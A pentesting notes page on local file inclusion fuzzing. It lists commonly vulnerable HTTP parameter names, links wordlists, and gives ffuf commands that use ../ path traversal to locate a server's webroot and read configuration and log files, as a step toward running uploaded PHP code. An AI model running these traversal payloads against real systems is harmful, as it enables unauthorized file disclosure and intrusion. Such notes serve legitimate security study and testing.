---
Primary_category: "[[LFI]]"
title: LFI - FUZZING
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LFI]]

#### *Known Parameters*

> ***[Reference](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters)***

> [!BUG]- *HTTP Parameters*
>
> ```bash
> ?cat={payload}
> ?dir={payload}
> ?action={payload}
> ?board={payload}
> ?date={payload}
> ?detail={payload}
> ?file={payload}
> ?download={payload}
> ?path={payload}
> ?folder={payload}
> ?prefix={payload}
> ?include={payload}
> ?page={payload}
> ?inc={payload}
> ?locate={payload}
> ?show={payload}
> ?doc={payload}
> ?site={payload}
> ?type={payload}
> ?view={payload}
> ?content={payload}
> ?document={payload}
> ?layout={payload}
> ?mod={payload}
> ?conf={payload}
> ```
>

---

#### *Wordlists*

***[Seclists: Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)***

***[LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)***

---

#### *Fuzzing Hidden Parameters*

> ***See [[FUZZING#HTTP Parameters|here]]***

---

#### *Fuzzing Server Files*

##### *Server Webroot*

> ***[Linux Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)***

> ***[Windows Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)***

There are situations where we must locate the *Server Webroot* to point to the directory where we have uploaded a given file containing *PHP* code in order to evaluate its content through the *LFI*

Since we do not know if the *webroot* path is */var/www/html* or */var/www/html/domain.com* or another, first we will have to discover the directory in question

```bash
/usr/share/seclist/Discovery/Web-Content/default-web-root-directory-windows.txt
/usr/share/seclist/Discovery/Web-Content/default-web-root-directory-linux.txt
```

###### *FFUF*

> ***[Ffuf](https://github.com/ffuf/ffuf)***

```bash
ffuf -v -t <THREADS> -w <WORDLIST> -u 'http[s]://<TARGET>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <INT>
```

##### *Server Logs | Configurations*

If we were not able to identify the *server webroot* through the previous *fuzzing*, we should try to read the web server configuration file since there is a directive within it called *root ( Nginx )* or *DocumentRoot ( Apache )* which points to the web application root

To do so, we may use the ***[LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)*** wordlist, as it contains many of the server logs we are looking for

If we want a more precise scan, we can use the following wordlists

###### *Web Server Configuration Files*

***[Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)***&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;***[Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)***

###### *FFUF*

> ***[Ffuf](https://github.com/ffuf/ffuf)***

```bash
ffuf -v -t <THREADS> -w <WORDLIST> -u 'http[s]://<TARGET>:<PORT>/index.php?language=../../../../FUZZ' -fs <INT>
```

